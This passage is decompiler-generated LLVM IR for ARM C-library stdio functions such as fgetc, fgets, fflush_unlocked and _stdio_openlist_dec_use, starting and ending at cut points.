  uselistorder label %dec_label_pc_1aabc, { 1, 0 }
  uselistorder label %dec_label_pc_1aa74, { 2, 0, 1 }
  uselistorder label %bb254, { 1, 0 }
  uselistorder label %dec_label_pc_1a9d4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1a94c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1a91c, { 1, 0 }
  uselistorder label %.thread47, { 1, 0 }
  uselistorder label %dec_label_pc_1a8f4, { 1, 0 }
  uselistorder label %dec_label_pc_1a8c8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1a8a4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1a874, { 2, 1, 0 }
  uselistorder label %.thread35, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1a7bc, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_1a7ac, { 1, 0 }
  uselistorder label %bb236, { 1, 0 }
  uselistorder label %bb234, { 1, 0 }
  uselistorder label %bb232, { 1, 0 }
  uselistorder label %.thread145, { 1, 0 }
  uselistorder label %._crit_edge93, { 1, 0 }
  uselistorder label %bb228, { 1, 0 }
  uselistorder label %bb226, { 1, 0 }
  uselistorder label %.preheader, { 3, 1, 0, 2 }
  uselistorder label %bb223, { 1, 0 }
  uselistorder label %dec_label_pc_1a6d4, { 2, 1, 0 }
  uselistorder label %bb220, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1a5e0, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_1a590, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1a588, { 1, 0 }
  uselistorder label %bb212, { 1, 0 }
  uselistorder label %.thread124, { 1, 0 }
  uselistorder label %dec_label_pc_1a46c, { 1, 0 }
  uselistorder label %.thread10, { 1, 0 }
  uselistorder label %dec_label_pc_1a388, { 1, 0 }
  uselistorder label %bb205, { 1, 0 }
  uselistorder label %bb203, { 1, 0 }
  uselistorder label %bb201, { 1, 0 }
}

define i32 @__GI_fgetc(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_1aaf4 = load i32, i32* @r4, align 4
  store i32 %v3_1aaf4, i32* %stack_var_-16, align 4
  %v6_1aaf4 = load i32, i32* @r5, align 4
  %v12_1aaf4 = load i32, i32* @lr, align 4
  %v1_1aaf8 = add i32 %arg1, 52
  %v2_1aaf8 = inttoptr i32 %v1_1aaf8 to i32*
  %v3_1aaf8 = load i32, i32* %v2_1aaf8, align 4
  %v2_1ab00 = icmp eq i32 %v3_1aaf8, 0
  store i32 %arg1, i32* @r5, align 4
  store i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32* %r6.global-to-local, align 4
  br i1 %v2_1ab00, label %dec_label_pc_1ab38, label %dec_label_pc_1ab14

dec_label_pc_1ab14:                               ; preds = %entry
  %v1_1ab14 = add i32 %arg1, 16
  %v2_1ab14 = inttoptr i32 %v1_1ab14 to i32*
  %v3_1ab14 = load i32, i32* %v2_1ab14, align 4
  %v1_1ab18 = add i32 %arg1, 24
  %v2_1ab18 = inttoptr i32 %v1_1ab18 to i32*
  %v3_1ab18 = load i32, i32* %v2_1ab18, align 4
  %v3_1ab1c = icmp ult i32 %v3_1ab14, %v3_1ab18
  br i1 %v3_1ab1c, label %.thread, label %dec_label_pc_1ab2c

.thread:                                          ; preds = %dec_label_pc_1ab14
  %v2_1ab20 = inttoptr i32 %v3_1ab14 to i8*
  %v3_1ab20 = load i8, i8* %v2_1ab20, align 1
  %v4_1ab20 = zext i8 %v3_1ab20 to i32
  store i32 %v4_1ab20, i32* %r4.global-to-local, align 4
  %v6_1ab20 = add i32 %v3_1ab14, 1
  store i32 %v6_1ab20, i32* %v2_1ab14, align 4
  br label %dec_label_pc_1abac

dec_label_pc_1ab2c:                               ; preds = %dec_label_pc_1ab14
  %v1_1ab2c = inttoptr i32 %arg1 to i16*
  %v2_1ab2c = call i32 @getc_unlocked(i16* %v1_1ab2c)
  store i32 %v2_1ab2c, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1abac

dec_label_pc_1ab38:                               ; preds = %entry
  %v1_1ab3c = add i32 %arg1, 56
  store i32 %v1_1ab3c, i32* @r4, align 4
  %v4_1ab50 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32 80) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_1ab50)
  %v0_1ab64 = load i32, i32* %r6.global-to-local, align 4
  %v2_1ab64 = add i32 %v0_1ab64, 20
  %v3_1ab64 = inttoptr i32 %v2_1ab64 to i32*
  %v4_1ab64 = load i32, i32* %v3_1ab64, align 4
  store i32 109424, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_1ab64)
  %v0_1ab70 = load i32, i32* @r5, align 4
  %v1_1ab70 = add i32 %v0_1ab70, 16
  %v2_1ab70 = inttoptr i32 %v1_1ab70 to i32*
  %v3_1ab70 = load i32, i32* %v2_1ab70, align 4
  %v1_1ab74 = add i32 %v0_1ab70, 24
  %v2_1ab74 = inttoptr i32 %v1_1ab74 to i32*
  %v3_1ab74 = load i32, i32* %v2_1ab74, align 4
  %v3_1ab78 = icmp ult i32 %v3_1ab70, %v3_1ab74
  br i1 %v3_1ab78, label %.thread2, label %dec_label_pc_1ab88

.thread2:                                         ; preds = %dec_label_pc_1ab38
  %v2_1ab7c = inttoptr i32 %v3_1ab70 to i8*
  %v3_1ab7c = load i8, i8* %v2_1ab7c, align 1
  %v4_1ab7c = zext i8 %v3_1ab7c to i32
  store i32 %v4_1ab7c, i32* %r4.global-to-local, align 4
  %v6_1ab7c = add i32 %v3_1ab70, 1
  store i32 %v6_1ab7c, i32* %v2_1ab70, align 4
  br label %dec_label_pc_1ab94

dec_label_pc_1ab88:                               ; preds = %dec_label_pc_1ab38
  %v1_1ab8c = inttoptr i32 %v0_1ab70 to i16*
  %v2_1ab8c = call i32 @getc_unlocked(i16* %v1_1ab8c)
  store i32 %v2_1ab8c, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1ab94

dec_label_pc_1ab94:                               ; preds = %.thread2, %dec_label_pc_1ab88
  %v0_1aba0 = load i32, i32* %r6.global-to-local, align 4
  %v2_1aba0 = add i32 %v0_1aba0, 28
  %v3_1aba0 = inttoptr i32 %v2_1aba0 to i32*
  %v4_1aba0 = load i32, i32* %v3_1aba0, align 4
  store i32 %v4_1aba0, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_1aba0)
  br label %dec_label_pc_1abac

dec_label_pc_1abac:                               ; preds = %.thread, %dec_label_pc_1ab2c, %dec_label_pc_1ab94
  %v0_1abac = load i32, i32* %r4.global-to-local, align 4
  %v2_1abb4 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1abb4, i32* @r4, align 4
  store i32 %v6_1aaf4, i32* @r5, align 4
  store i32 %v12_1aaf4, i32* @lr, align 4
  ret i32 %v0_1abac

; uselistorder directives
  uselistorder i32 %v3_1ab70, { 1, 0, 2 }
  uselistorder i32 %v3_1ab14, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32 %arg1, { 1, 2, 4, 3, 0, 5 }
  uselistorder label %dec_label_pc_1abac, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1ab94, { 1, 0 }
}

define i32 @function_1abc0(i32 %arg1) local_unnamed_addr {
dec_label_pc_1abc0:
  %v0_1abc0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1abc0, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_1abc0
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_1abc0, %bb
  %v10_1abcc = phi i32 [ %arg1, %dec_label_pc_1abc0 ], [ 0, %bb ]
  ret i32 %v10_1abcc

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @fgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_1abd0 = load i32, i32* @r4, align 4
  store i32 %v3_1abd0, i32* %stack_var_-28, align 4
  %v6_1abd0 = load i32, i32* @r5, align 4
  %v9_1abd0 = load i32, i32* @r6, align 4
  %v12_1abd0 = load i32, i32* @r7, align 4
  %v21_1abd0 = load i32, i32* @lr, align 4
  %v1_1abd4 = add i32 %arg3, 52
  %v2_1abd4 = inttoptr i32 %v1_1abd4 to i32*
  %v3_1abd4 = load i32, i32* %v2_1abd4, align 4
  %v1_1abdc = sub i32 1, %v3_1abd4
  %v2_1abdc = icmp ult i32 %v3_1abd4, 2
  br i1 %v2_1abdc, label %bb16, label %bb

bb:                                               ; preds = %entry
  br label %bb16

bb16:                                             ; preds = %entry, %bb
  %storemerge = phi i32 [ 0, %bb ], [ %v1_1abdc, %entry ]
  %v0_1abe4 = phi i32 [ 0, %bb ], [ %v1_1abdc, %entry ]
  store i32 %storemerge, i32* %sl.global-to-local, align 4
  %v2_1abe4 = icmp eq i32 %v0_1abe4, 0
  store i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32* @r5, align 4
  store i32 %arg3, i32* @r6, align 4
  store i32 %arg1, i32* %r8.global-to-local, align 4
  store i32 %arg2, i32* @r7, align 4
  br i1 %v2_1abe4, label %dec_label_pc_1ac38, label %dec_label_pc_1ac00

dec_label_pc_1ac00:                               ; preds = %bb16
  %v1_1ac04 = add i32 %arg3, 56
  store i32 %v1_1ac04, i32* @r4, align 4
  %v4_1ac18 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32 80) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_1ac18)
  %v0_1ac2c = load i32, i32* @r5, align 4
  %v2_1ac2c = add i32 %v0_1ac2c, 20
  %v3_1ac2c = inttoptr i32 %v2_1ac2c to i32*
  %v4_1ac2c = load i32, i32* %v3_1ac2c, align 4
  store i32 %v4_1ac2c, i32* @ip, align 4
  store i32 ptrtoint (i32* @global_var_1ac38.1161 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_1ac2c)
  %v0_1ac38.pre = load i32, i32* %r8.global-to-local, align 4
  %v0_1ac3c.pre = load i32, i32* @r7, align 4
  %v0_1ac40.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_1ac38

dec_label_pc_1ac38:                               ; preds = %bb16, %dec_label_pc_1ac00
  %v0_1ac40 = phi i32 [ %arg3, %bb16 ], [ %v0_1ac40.pre, %dec_label_pc_1ac00 ]
  %v0_1ac3c = phi i32 [ %arg2, %bb16 ], [ %v0_1ac3c.pre, %dec_label_pc_1ac00 ]
  %v0_1ac38 = phi i32 [ %arg1, %bb16 ], [ %v0_1ac38.pre, %dec_label_pc_1ac00 ]
  %v3_1ac44 = inttoptr i32 %v0_1ac38 to i8*
  %v4_1ac44 = call i32 @__GI_fgets_unlocked(i8* %v3_1ac44, i32 %v0_1ac3c, i32 %v0_1ac40)
  %v0_1ac48 = load i32, i32* %sl.global-to-local, align 4
  %v2_1ac48 = icmp eq i32 %v0_1ac48, 0
  store i32 %v4_1ac44, i32* %r4.global-to-local, align 4
  br i1 %v2_1ac48, label %dec_label_pc_1ac38..thread3_crit_edge, label %bb17

dec_label_pc_1ac38..thread3_crit_edge:            ; preds = %dec_label_pc_1ac38
  %v0_1ac64.pre = load i32, i32* @ip, align 4
  br label %.thread3

bb17:                                             ; preds = %dec_label_pc_1ac38
  %v1_1ac5c = load i32, i32* @r5, align 4
  %v3_1ac5c = add i32 %v1_1ac5c, 28
  %v4_1ac5c = inttoptr i32 %v3_1ac5c to i32*
  %v5_1ac5c = load i32, i32* %v4_1ac5c, align 4
  store i32 %v5_1ac5c, i32* @ip, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_1ac38..thread3_crit_edge, %bb17
  %v0_1ac64 = phi i32 [ %v0_1ac64.pre, %dec_label_pc_1ac38..thread3_crit_edge ], [ %v5_1ac5c, %bb17 ]
  %v2_1ac64 = xor i1 %v2_1ac48, true
  call void @__pseudo_cond_branch(i1 %v2_1ac64, i32 %v0_1ac64)
  %v0_1ac68 = load i32, i32* %r4.global-to-local, align 4
  %v2_1ac70 = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_1ac70, i32* @r4, align 4
  store i32 %v6_1abd0, i32* @r5, align 4
  store i32 %v9_1abd0, i32* @r6, align 4
  store i32 %v12_1abd0, i32* @r7, align 4
  store i32 %v21_1abd0, i32* @lr, align 4
  ret i32 %v0_1ac68

; uselistorder directives
  uselistorder i32 %v3_1abd4, { 1, 0 }
  uselistorder i32* %sl.global-to-local, { 1, 0 }
  uselistorder i32 %arg3, { 0, 3, 1, 2 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_1ac38, { 1, 0 }
  uselistorder label %bb16, { 1, 0 }
}

define i32 @function_1ac7c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1ac7c:
  %v0_1ac7c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1ac7c, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_1ac7c
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_1ac7c, %bb
  %v10_1ac88 = phi i32 [ %arg1, %dec_label_pc_1ac7c ], [ 0, %bb ]
  ret i32 %v10_1ac88

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @_stdio_openlist_dec_use() local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_1ac8c = load i32, i32* @r4, align 4
  store i32 %v3_1ac8c, i32* %stack_var_-24, align 4
  store i32 40, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32* %r6.global-to-local, align 4
  %v4_1ac9c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32 40) to i32*), align 4
  store i32 %v4_1ac9c, i32* %r8.global-to-local, align 4
  store i32 120, i32* %r3.global-to-local, align 4
  %v4_1aca4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32 120) to i32*), align 4
  store i32 %v4_1aca4, i32* %r4.global-to-local, align 4
  store i32 80, i32* %r3.global-to-local, align 4
  %v4_1acb0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32 80) to i32*), align 4
  store i32 %v4_1acb0, i32* %r7.global-to-local, align 4
  %v2_1acbc = ptrtoint i32* %stack_var_-40 to i32
  call void @__pseudo_branch(i32 %v4_1acb0)
  store i32 20, i32* %r3.global-to-local, align 4
  %v0_1acd0 = load i32, i32* %r6.global-to-local, align 4
  %v2_1acd0 = add i32 %v0_1acd0, 20
  %v3_1acd0 = inttoptr i32 %v2_1acd0 to i32*
  %v4_1acd0 = load i32, i32* %v3_1acd0, align 4
  store i32 %v4_1acd0, i32* %r5.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_1acd0)
  store i32 12, i32* %r3.global-to-local, align 4
  %v0_1ace0 = load i32, i32* %r6.global-to-local, align 4
  %v2_1ace0 = add i32 %v0_1ace0, 12
  %v3_1ace0 = inttoptr i32 %v2_1ace0 to i32*
  %v4_1ace0 = load i32, i32* %v3_1ace0, align 4
  store i32 %v4_1ace0, i32* %r3.global-to-local, align 4
  %v1_1ace4 = inttoptr i32 %v4_1ace0 to i32*
  %v2_1ace4 = load i32, i32* %v1_1ace4, align 4
  store i32 %v2_1ace4, i32* %r3.global-to-local, align 4
  %v7_1ace8 = icmp eq i32 %v2_1ace4, 1
  br i1 %v7_1ace8, label %dec_label_pc_1acf0, label %dec_label_pc_1adb0

dec_label_pc_1acf0:                               ; preds = %entry
  store i32 56, i32* %r3.global-to-local, align 4
  %v2_1acf4 = add i32 %v0_1ace0, 56
  %v3_1acf4 = inttoptr i32 %v2_1acf4 to i32*
  %v4_1acf4 = load i32, i32* %v3_1acf4, align 4
  store i32 %v4_1acf4, i32* %r3.global-to-local, align 4
  %v1_1acf8 = inttoptr i32 %v4_1acf4 to i32*
  %v2_1acf8 = load i32, i32* %v1_1acf8, align 4
  store i32 %v2_1acf8, i32* %r3.global-to-local, align 4
  %tmp32 = icmp slt i32 %v2_1acf8, 1
  br i1 %tmp32, label %dec_label_pc_1adb0, label %dec_label_pc_1ad04

dec_label_pc_1ad04:                               ; preds = %dec_label_pc_1acf0
  store i32 108, i32* %r3.global-to-local, align 4
  %v2_1ad08 = add i32 %v0_1ace0, 108
  %v3_1ad08 = inttoptr i32 %v2_1ad08 to i32*
  %v4_1ad08 = load i32, i32* %v3_1ad08, align 4
  store i32 %v4_1ad08, i32* %r4.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_1acb0)
  call void @__pseudo_branch(i32 %v4_1acd0)
  %v0_1ad30 = load i32, i32* %r6.global-to-local, align 4
  %v2_1ad30 = add i32 %v0_1ad30, 52
  %v3_1ad30 = inttoptr i32 %v2_1ad30 to i32*
  %v4_1ad30 = load i32, i32* %v3_1ad30, align 4
  store i32 %v4_1ad30, i32* %r3.global-to-local, align 4
  %v1_1ad34 = inttoptr i32 %v4_1ad30 to i32*
  %v2_1ad34 = load i32, i32* %v1_1ad34, align 4
  store i32 %v2_1ad34, i32* %r4.global-to-local, align 4
  store i32 52, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v2_1ad8013 = icmp eq i32 %v2_1ad34, 0
  br i1 %v2_1ad8013, label %dec_label_pc_1ad8c, label %dec_label_pc_1ad44

dec_label_pc_1ad44:                               ; preds = %dec_label_pc_1ad04, %dec_label_pc_1ad7c
  %v0_1ad684 = phi i32 [ %v0_1ad7c, %dec_label_pc_1ad7c ], [ %v2_1ad34, %dec_label_pc_1ad04 ]
  %v1_1ad44 = inttoptr i32 %v0_1ad684 to i16*
  %v2_1ad44 = load i16, i16* %v1_1ad44, align 2
  %v3_1ad44 = zext i16 %v2_1ad44 to i32
  store i32 %v3_1ad44, i32* %r3.global-to-local, align 4
  %v2_1ad48 = and i32 %v3_1ad44, 32816
  %v7_1ad4c = icmp eq i32 %v2_1ad48, 48
  %v1_1ad50 = add i32 %v0_1ad684, 32
  %v2_1ad50 = inttoptr i32 %v1_1ad50 to i32*
  %v3_1ad50 = load i32, i32* %v2_1ad50, align 4
  store i32 %v3_1ad50, i32* %r5.global-to-local, align 4
  br i1 %v7_1ad4c, label %dec_label_pc_1ad5c, label %.thread23

.thread23:                                        ; preds = %dec_label_pc_1ad44
  store i32 %v0_1ad684, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1ad7c

dec_label_pc_1ad5c:                               ; preds = %dec_label_pc_1ad44
  %v0_1ad5c = load i32, i32* %r7.global-to-local, align 4
  %v2_1ad5c = icmp eq i32 %v0_1ad5c, 0
  br i1 %v2_1ad5c, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_1ad5c
  %v1_1ad60 = load i32, i32* %r6.global-to-local, align 4
  %v2_1ad60 = load i32, i32* %r8.global-to-local, align 4
  %v3_1ad60 = add i32 %v2_1ad60, %v1_1ad60
  %v4_1ad60 = inttoptr i32 %v3_1ad60 to i32*
  %v5_1ad60 = load i32, i32* %v4_1ad60, align 4
  store i32 %v5_1ad60, i32* %r3.global-to-local, align 4
  %v3_1ad64 = inttoptr i32 %v5_1ad60 to i32*
  store i32 %v3_1ad50, i32* %v3_1ad64, align 4
  %v0_1ad68 = load i32, i32* %r4.global-to-local, align 4
  %v1_1ad68 = inttoptr i32 %v0_1ad68 to i16*
  %v2_1ad68 = load i16, i16* %v1_1ad68, align 2
  %v3_1ad68 = zext i16 %v2_1ad68 to i32
  store i32 %v3_1ad68, i32* %r3.global-to-local, align 4
  br label %bb33

bb:                                               ; preds = %dec_label_pc_1ad5c
  %v2_1ad6810 = load i16, i16* %v1_1ad44, align 2
  %v3_1ad6811 = zext i16 %v2_1ad6810 to i32
  store i32 %v3_1ad6811, i32* %r3.global-to-local, align 4
  %v3_1ad6c = add i32 %v0_1ad5c, 32
  %v4_1ad6c = inttoptr i32 %v3_1ad6c to i32*
  store i32 %v3_1ad50, i32* %v4_1ad6c, align 4
  %v0_1ad70.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb33

bb33:                                             ; preds = %.thread, %bb
  %v0_1ad70 = phi i32 [ %v3_1ad68, %.thread ], [ %v0_1ad70.pre, %bb ]
  %v1_1ad70 = and i32 %v0_1ad70, 8192
  %v2_1ad70 = icmp eq i32 %v1_1ad70, 0
  br i1 %v2_1ad70, label %bb35, label %bb34

bb34:                                             ; preds = %bb33
  br label %bb35

bb35:                                             ; preds = %bb33, %bb34
  %v1_1ad78 = xor i1 %v2_1ad70, true
  call void @__pseudo_cond_branch(i1 %v1_1ad78, i32 ptrtoint (i32* @global_var_17268.1116 to i32))
  %v0_1ad7c.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1ad7c

dec_label_pc_1ad7c:                               ; preds = %.thread23, %bb35
  %v0_1ad7c = phi i32 [ %v0_1ad7c.pre, %bb35 ], [ %v3_1ad50, %.thread23 ]
  store i32 %v0_1ad7c, i32* %r4.global-to-local, align 4
  %v2_1ad80 = icmp eq i32 %v0_1ad7c, 0
  br i1 %v2_1ad80, label %dec_label_pc_1ad80.dec_label_pc_1ad8c_crit_edge, label %dec_label_pc_1ad44

dec_label_pc_1ad80.dec_label_pc_1ad8c_crit_edge:  ; preds = %dec_label_pc_1ad7c
  %v0_1ad98.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1ad8c

dec_label_pc_1ad8c:                               ; preds = %dec_label_pc_1ad80.dec_label_pc_1ad8c_crit_edge, %dec_label_pc_1ad04
  %v0_1ad98 = phi i32 [ %v0_1ad98.pre, %dec_label_pc_1ad80.dec_label_pc_1ad8c_crit_edge ], [ %v0_1ad30, %dec_label_pc_1ad04 ]
  store i32 28, i32* %r3.global-to-local, align 4
  %v2_1ad98 = add i32 %v0_1ad98, 28
  %v3_1ad98 = inttoptr i32 %v2_1ad98 to i32*
  %v4_1ad98 = load i32, i32* %v3_1ad98, align 4
  call void @__pseudo_branch(i32 %v4_1ad98)
  store i32 56, i32* %r3.global-to-local, align 4
  %v0_1ada8 = load i32, i32* %r6.global-to-local, align 4
  %v2_1ada8 = add i32 %v0_1ada8, 56
  %v3_1ada8 = inttoptr i32 %v2_1ada8 to i32*
  %v4_1ada8 = load i32, i32* %v3_1ada8, align 4
  store i32 %v4_1ada8, i32* %r3.global-to-local, align 4
  %v0_1adac = load i32, i32* %r4.global-to-local, align 4
  %v2_1adac = inttoptr i32 %v4_1ada8 to i32*
  store i32 %v0_1adac, i32* %v2_1adac, align 4
  %v0_1adb4.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1adb0

dec_label_pc_1adb0:                               ; preds = %entry, %dec_label_pc_1acf0, %dec_label_pc_1ad8c
  %v0_1adb4 = phi i32 [ %v0_1ace0, %entry ], [ %v0_1ace0, %dec_label_pc_1acf0 ], [ %v0_1adb4.pre, %dec_label_pc_1ad8c ]
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_1adb4 = add i32 %v0_1adb4, 12
  %v3_1adb4 = inttoptr i32 %v2_1adb4 to i32*
  %v4_1adb4 = load i32, i32* %v3_1adb4, align 4
  %v1_1adb8 = inttoptr i32 %v4_1adb4 to i32*
  %v2_1adb8 = load i32, i32* %v1_1adb8, align 4
  %v1_1adbc = add i32 %v2_1adb8, -1
  store i32 %v1_1adbc, i32* %v1_1adb8, align 4
  store i32 28, i32* %r3.global-to-local, align 4
  %v0_1add0 = load i32, i32* %r6.global-to-local, align 4
  %v2_1add0 = add i32 %v0_1add0, 28
  %v3_1add0 = inttoptr i32 %v2_1add0 to i32*
  %v4_1add0 = load i32, i32* %v3_1add0, align 4
  store i32 %v4_1add0, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_1add0)
  %v2_1ade0 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_1ade0, i32* %r4.global-to-local, align 4
  ret i32 %v2_1acbc

; uselistorder directives
  uselistorder i32 %v0_1ad7c, { 2, 1, 0 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r6.global-to-local, { 0, 7, 1, 6, 2, 3, 4, 5, 8 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 20, 21, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19 }
  uselistorder label %dec_label_pc_1adb0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1ad7c, { 1, 0 }
  uselistorder label %bb35, { 1, 0 }
  uselistorder label %bb33, { 1, 0 }
  uselistorder label %dec_label_pc_1ad44, { 1, 0 }
}

define i32 @function_1adec(i32 %arg1) local_unnamed_addr {
dec_label_pc_1adec:
  %v0_1adec = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1adec, label %bb, label %.thread8

bb:                                               ; preds = %dec_label_pc_1adec
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_1adec, %bb
  %v10_1ae10 = phi i32 [ %arg1, %dec_label_pc_1adec ], [ 0, %bb ]
  ret i32 %v10_1ae10

; uselistorder directives
  uselistorder label %.thread8, { 1, 0 }
}

define i32 @fflush_unlocked(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r3.global-to-local, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-72 = alloca i32, align 4
  store i32 52, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32* %sb.global-to-local, align 4
  %v4_1ae24 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32 52) to i32*), align 4
  store i32 %v4_1ae24, i32* %r3.global-to-local, align 4
  %v10_1ae28 = icmp eq i32 %tmp, %v4_1ae24
  store i32 %tmp, i32* %fp.global-to-local, align 4
  br i1 %v10_1ae28, label %bb, label %dec_label_pc_1ae40

bb:                                               ; preds = %entry
  store i32 0, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_1ae50

dec_label_pc_1ae40:                               ; preds = %entry
  store i32 256, i32* %r2.global-to-local, align 4
  %v2_1ae44 = icmp eq i16* %arg1, null
  br i1 %v2_1ae44, label %dec_label_pc_1ae50, label %dec_label_pc_1afb8

dec_label_pc_1ae50:                               ; preds = %bb, %dec_label_pc_1ae40
  %stack_var_-60.1.in = phi i32 [ 0, %bb ], [ 256, %dec_label_pc_1ae40 ]
  store i32 120, i32* %r3.global-to-local, align 4
  store i32 20, i32* %r2.global-to-local, align 4
  %v4_1ae64 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32 120) to i32*), align 4
  store i32 80, i32* %r3.global-to-local, align 4
  %v4_1ae70 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32 80) to i32*), align 4
  store i32 20, i32* %stack_var_-72, align 4
  store i32 %v4_1ae64, i32* %r2.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_1ae70)
  store i32 20, i32* %r3.global-to-local, align 4
  %v0_1ae94 = load i32, i32* %sb.global-to-local, align 4
  %v2_1ae94 = add i32 %v0_1ae94, 20
  %v3_1ae94 = inttoptr i32 %v2_1ae94 to i32*
  %v4_1ae94 = load i32, i32* %v3_1ae94, align 4
  call void @__pseudo_branch(i32 %v4_1ae94)
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_1aea4 = add i32 %v0_1ae94, 12
  %v3_1aea4 = inttoptr i32 %v2_1aea4 to i32*
  %v4_1aea4 = load i32, i32* %v3_1aea4, align 4
  store i32 %v4_1aea4, i32* %r2.global-to-local, align 4
  %v1_1aea8 = inttoptr i32 %v4_1aea4 to i32*
  %v2_1aea8 = load i32, i32* %v1_1aea8, align 4
  store i32 28, i32* %sl.global-to-local, align 4
  %v1_1aeb0 = add i32 %v2_1aea8, 1
  store i32 %v1_1aeb0, i32* %r3.global-to-local, align 4
  %v2_1aeb4 = add i32 %v0_1ae94, 28
  %v3_1aeb4 = inttoptr i32 %v2_1aeb4 to i32*
  %v4_1aeb4 = load i32, i32* %v3_1aeb4, align 4
  store i32 %v1_1aeb0, i32* %v1_1aea8, align 4
  call void @__pseudo_branch(i32 %v4_1aeb4)
  store i32 108, i32* %r3.global-to-local, align 4
  %v0_1aed0 = load i32, i32* %sb.global-to-local, align 4
  %v2_1aed0 = add i32 %v0_1aed0, 108
  %v3_1aed0 = inttoptr i32 %v2_1aed0 to i32*
  %v4_1aed0 = load i32, i32* %v3_1aed0, align 4
  store i32 %v4_1aed0, i32* @r4, align 4
  store i32 %v4_1aed0, i32* %r2.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_1ae70)
  call void @__pseudo_branch(i32 %v4_1ae94)
  store i32 52, i32* %r3.global-to-local, align 4
  %v0_1aef8 = load i32, i32* %sb.global-to-local, align 4
